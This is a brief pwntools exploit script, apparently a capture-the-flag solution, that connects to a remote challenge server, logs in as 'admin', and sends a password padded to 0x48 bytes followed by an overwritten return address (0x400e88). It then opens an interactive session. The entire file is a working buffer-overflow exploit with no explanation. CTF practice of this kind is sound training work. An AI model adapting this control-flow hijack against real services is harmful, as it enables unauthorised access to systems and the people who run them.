from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('login')
io = remote('node4.buuoj.cn', 29300)                                                                                                                                                                                 
payload = b'2jctf_pa5sw0rd'.ljust(0x48, b'\x00') + p64(0x400e88)
io.sendlineafter('username: ', b'admin')
io.sendafter('password: ', payload)
io.interactive()

